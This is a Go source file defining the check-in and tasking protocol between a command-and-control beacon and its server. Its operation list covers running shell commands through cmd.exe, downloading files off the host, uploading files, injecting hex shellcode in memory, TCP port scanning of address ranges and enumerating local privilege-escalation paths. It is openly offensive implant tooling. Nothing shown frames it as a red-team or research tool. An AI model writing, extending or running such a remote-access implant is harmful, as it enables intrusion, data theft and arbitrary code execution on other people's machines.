package proto

// Request kinds, sent beacon -> server.
const (
	KindCheckin = "checkin"
	KindResult  = "result"
)

// Task operations, sent server -> beacon.
const (
	OpShell    = "shell"    // Arg: command line, run through cmd.exe /c
	OpDownload = "download" // Arg: remote path; beacon returns base64 content
	OpUpload   = "upload"   // Arg: JSON UploadArg; beacon writes the file
	OpInject   = "inject"   // Arg: hex shellcode; executed in memory via umbra
	OpSleep    = "sleep"    // Arg: decimal seconds
	OpExit     = "exit"     // beacon terminates
	OpPortScan = "portscan" // Arg: JSON PortScanArg; concurrent TCP connect scan
	OpPriv     = "priv"     // Arg: optional check name (empty = all); local privesc enumeration
)

// HostInfo describes the beacon host at check-in.
type HostInfo struct {
	Hostname string `json:"hostname"`
	User     string `json:"user"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
}

// Request is a message from the beacon to the server.
type Request struct {
	ID      string       `json:"id"`
	Seq     uint64       `json:"seq"`
	Kind    string       `json:"kind"`
	Host    HostInfo     `json:"host,omitempty"`
	Results []TaskResult `json:"results,omitempty"`
}

// Response is a message from the server to the beacon.
type Response struct {
	Ack   bool   `json:"ack"`
	Tasks []Task `json:"tasks,omitempty"`
}

// Task is a single operator command.
type Task struct {
	TID string `json:"tid"`
	Op  string `json:"op"`
	Arg string `json:"arg,omitempty"`
}

// TaskResult carries the outcome of a Task back to the server.
type TaskResult struct {
	TID string `json:"tid"`
	OK  bool   `json:"ok"`
	Out string `json:"out,omitempty"`
}

// UploadArg is the JSON payload of an OpUpload task Arg.
type UploadArg struct {
	Path string `json:"path"`
	Data string `json:"data"` // base64 file content
}

// PortScanArg is the JSON payload of an OpPortScan task Arg.
// Hosts accepts comma-separated IPs/hostnames and CIDR blocks (e.g. 10.0.0.0/24).
// Ports accepts comma-separated ports and ranges (e.g. "22,80,443,1-1024");
// empty means a curated top-ports list. Timeout is milliseconds per dial,
// Threads is the worker count.
type PortScanArg struct {
	Hosts   string `json:"hosts"`
	Ports   string `json:"ports,omitempty"`
	Timeout int    `json:"timeout,omitempty"`
	Threads int    `json:"threads,omitempty"`
}
